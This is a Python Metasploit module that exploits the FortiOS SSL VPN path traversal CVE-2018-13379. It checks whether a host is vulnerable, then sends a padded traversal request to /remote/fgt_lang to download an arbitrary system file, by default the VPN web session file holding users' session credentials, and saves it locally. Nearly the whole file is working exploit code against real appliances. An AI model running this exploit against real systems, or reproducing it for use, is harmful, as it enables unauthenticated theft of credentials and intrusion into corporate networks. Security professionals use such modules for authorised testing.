#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module
import logging

# extra modules
dependencies_missing = False
try:
    import re
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except ImportError:
    dependencies_missing = True

# metadata
metadata = {
    "name": "FortiOS system file leak through SSL VPN via path traversal and buffer overflow",
    "description": """
    A path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated attacker to download FortiOS system files through specially crafted HTTP resource requests.
    
    Affected Products:
       FortiOS 6.0 - 6.0.0 to 6.0.4
       FortiOS 5.6 - 5.6.3 to 5.6.7
       FortiOS 5.4 - 5.4.6 to 5.4.12
       (other branches and versions than above are not impacted)
       ONLY if the SSL VPN service (web-mode or tunnel-mode) is enabled.
    """,
    "authors": ["Tatam <tatam@protonmail.com>"],
    "date": "2018-07-06",
    "license": "MSF_LICENSE",
    "references": [
        {"type": "cve", "ref": "2018-13379"},
        {"type": "cve", "ref": "2018-13383"},
        {"type": "url", "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-13379"},
        {"type": "url", "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-13383"},
        {
            "type": "url",
            "ref": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379",
        },
        {
            "type": "url",
            "ref": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13383",
        },
        {"type": "url", "ref": "https://www.fortiguard.com/psirt/FG-IR-18-384"},
        {"type": "url", "ref": "https://www.fortiguard.com/psirt/FG-IR-18-388"},
        {
            "type": "url",
            "ref": "https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf",
        },
    ],
    "type": "single_scanner",
    "rank": "normal",
    "options": {
        "RPORT": {
            "type": "port",
            "description": "The target port (TCP)",
            "required": True,
            "default": 4443,
        },
        "RFILE": {
            "type": "string",
            "description": "The remote file to dump (Less than or equal to 42 characters)",
            "required": True,
            "default": "/dev/cmdb/sslvpn_websession",
        },
        "OUTPUT": {
            "type": "string",
            "description": "The location where the file should be dumped",
            "required": True,
            "default": "/tmp/",
        },
    },
    "service_name": "ssl/http",
}


def write_file(args, text):
    rfile = args["RFILE"].replace("/", "_")
    output = args["OUTPUT"]
    if output[-1] != "/":
        output = "{}/".format(output)
    path = "{}{}{}".format(output, args["rhost"], rfile)
    try:
        fd = open(path, "w")
        fd.write(text)
        fd.close()
        module.log("Remote file {} dumped in {}".format(args["RFILE"], path), "good")
        return True
    except:
        module.log("Unable to write {} file".format(path), "error")
        return False


def check(args):
    path = "/remote/fgt_lang?lang=/../../../../////////////////etc/system.conf.def"
    try:
        res = requests.get(
            "https://{}:{}{}".format(args["rhost"], args["RPORT"], path), verify=False
        )
    except requests.exceptions.ConnectionError:
        module.log(
            "Host {} on port {} cannot be reached".format(args["rhost"], args["RPORT"]),
            level="error",
        )
        return False
    # Vulnerable
    if res.status_code == 200 and res.text[0:12] == "var fgt_lang":
        module.log(
            "Host {} is vulnerable to CVE-2018-13379".format(args["rhost"]),
            level="good",
        )
        return True
    # Maybe vulnerable
    elif res.status_code == 200 and res.text[0:12] != "var fgt_lang":
        module.log(
            "Host {} is maybe vulnerable to CVE-2018-13379 or protected by a WAF".format(
                args["rhost"]
            ),
            level="warning",
        )
        return False
    # Patched or not vulnerable
    elif res.status_code == 404:
        module.log(
            "Host {} is not vulnerable to CVE-2018-13379, maybe patched or not a FortiGate device".format(
                args["rhost"]
            ),
            level="warning",
        )
        return False
        # Unknow but not vulnerable
    else:
        module.log(
            "Host {} is not vulnerable to CVE-2018-13379".format(args["rhost"]),
            level="error",
        )
        return False


def exploit(args):
    base = "/remote/fgt_lang?lang=/../.."
    pad = 70 - (len(base) + len(args["RFILE"]))
    if pad < 0:
        module.log("RFILE must be less than or equal to 42 characters", "error")
        return False
    path = "{}{}{}".format(base, "/" * pad, args["RFILE"])
    res = requests.get(
        "https://{}:{}{}".format(args["rhost"], args["RPORT"], path), verify=False
    )
    if res.status_code != 200:
        module.log(
            "Unable to dump {}, this file doesn't exist".format(args["RFILE"]),
            "warning",
        )
        return False
    return write_file(args, res.text[16:])


def run(args):
    if dependencies_missing:
        module.log(
            "Module dependencies (requests) missing, cannot continue", level="error"
        )
        return False
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    # Check if vulnerable
    if not check(args):
        return False
    return exploit(args)


if __name__ == "__main__":
    module.run(metadata, run)
